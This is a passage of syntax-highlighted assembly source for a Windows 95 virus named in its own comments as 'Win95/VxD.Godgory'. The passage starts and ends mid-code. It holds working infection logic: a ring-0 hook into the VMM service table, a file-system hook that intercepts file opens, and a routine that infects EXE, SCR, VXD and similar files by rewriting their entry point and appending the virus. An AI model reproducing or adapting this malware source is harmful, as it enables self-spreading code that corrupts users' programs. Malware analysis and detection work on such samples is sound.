                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Virus_Sign</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Debug_Exit</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Debug_Exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Old_Debug</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Ring0_Start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Exec_Int_Start</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Exec_Int_Address</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Exec_Int_Start2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Go_Resident</span><span class="sc0">

</span><span class="sc5">PE_Start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PE_Delta</span><span class="sc0">
</span><span class="sc5">PE_Delta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">PE_Start</span><span class="sc4">-</span><span class="sc5">PE_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">PE_Entrypoint</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Host_Entrypoint</span><span class="sc4">-</span><span class="sc5">PE_Delta</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Fix possible relocation</span><span class="sc0">
                </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Remove_SEH</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VMM_DDB_Address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.DDB_Name</span><span class="sc4">],</span><span class="sc12">' MMV'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Remove_SEH</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Virus_Sign</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.DDB_Reserved3</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Remove_SEH</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.DDB_Reserved3</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.DDB_Service_Table_Ptr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+((</span><span class="sc9">lowword</span><span class="sc0"> </span><span class="sc5">@@Exec_Int</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Exec_Int_Address</span><span class="sc4">-</span><span class="sc5">PE_Delta</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Exec_Int_Start</span><span class="sc4">-</span><span class="sc5">PE_Delta</span><span class="sc4">)],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Exec_Int_Start2</span><span class="sc4">-</span><span class="sc5">PE_Delta</span><span class="sc4">)],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Ring0_Start</span><span class="sc4">-</span><span class="sc5">PE_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;Generate exception</span><span class="sc0">
</span><span class="sc5">Remove_SEH</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Host_Entrypoint</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Virus_Name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">49</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">95</span><span class="sc4">,</span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">73</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc2">72</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc4">,</span><span class="sc2">74</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">36</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc4">,</span><span class="sc2">73</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc4">,</span><span class="sc2">52</span><span class="sc4">,</span><span class="sc2">102</span><span class="sc0">
</span><span class="sc1">;Encrypted "Win95/VxD.Godgory, Horned Beast/VADER",0</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0">       </span><span class="sc5">File_Hook</span><span class="sc4">,</span><span class="sc5">CCALL</span><span class="sc4">,</span><span class="sc5">HIGH_FREQ</span><span class="sc0">

                </span><span class="sc5">ArgVar</span><span class="sc0">  </span><span class="sc5">FSDFnAddr</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">ArgVar</span><span class="sc0">  </span><span class="sc5">FunctionNum</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">ArgVar</span><span class="sc0">  </span><span class="sc5">Drive</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">ArgVar</span><span class="sc0">  </span><span class="sc5">ResourceFlags</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">ArgVar</span><span class="sc0">  </span><span class="sc5">CodePage</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">ArgVar</span><span class="sc0">  </span><span class="sc5">pir</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">

                </span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">LE_Info_Mem</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">LE_PE_Header_File</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">LE_Info_File</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">LE_Info_Size</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">DDB_Offset_File</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">
                </span><span class="sc5">LocalVar</span><span class="sc0"> </span><span class="sc5">File_Handle</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0">

                </span><span class="sc5">EnterProc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">Disable_Hook</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">File_Hook_Exit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FunctionNum</span><span class="sc4">],</span><span class="sc5">IFSFN_OPEN</span><span class="sc0"> </span><span class="sc1">;Function</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">File_Hook_Exit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">File_Delta</span><span class="sc0">
</span><span class="sc5">File_Delta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Disable_Hook</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Drive</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Drive number</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">No_Drive</span><span class="sc0"> </span><span class="sc1">;UNC resource</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">No_Drive</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pir</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Pointer to IOREQ</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_ppath</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ParsedPath.pp_elements</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">BCS_WANSI</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Virus_Virtual_End</span><span class="sc4">-</span><span class="sc5">Virus_Physical_End</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Dynamic_Link6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;File extension</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DXV'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Extension_OK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'683'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Extension_OK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EXE'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Extension_OK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'RCS'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Extension_OK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'RDP'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Infection_Done</span><span class="sc0">
</span><span class="sc5">Extension_OK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Read/write</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;Open file if it exists</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Original_FileIO</span><span class="sc0"> </span><span class="sc1">;Open the file (read/write mode)</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Infection_Done</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect_File</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_FileIO</span><span class="sc0"> </span><span class="sc1">;Close the file</span><span class="sc0">
</span><span class="sc5">Infection_Done</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Disable_Hook</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc5">File_Hook_Exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc5">LeaveProc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12345678h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Old_File</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc5">Return</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0">         </span><span class="sc5">File_Hook</span><span class="sc4">,</span><span class="sc5">KEEPFRAMEVARS</span><span class="sc0">

</span><span class="sc1">;Routines</span><span class="sc0">

</span><span class="sc1">;Infect file</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;  File_Handle=Handle of file to infect</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX,EBX,ECX,EDX,ESI=?</span><span class="sc0">
</span><span class="sc1">;  Update all data</span><span class="sc0">
</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Init data</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read_LE_PE</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Infect_LE</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_PE_Header_File</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read last section header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+(</span><span class="sc5">PE_Start</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.NT_OptionalHeader\
</span><span class="sc0">                </span><span class="sc5">.OH_AddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.NT_OptionalHeader\
</span><span class="sc0">                </span><span class="sc5">.OH_ImageBase</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Host_Entrypoint</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">PE_Entrypoint</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer.NT_OptionalHeader\
</span><span class="sc0">                </span><span class="sc5">.OH_FileAlignment</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">Virus_Physical_Size</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
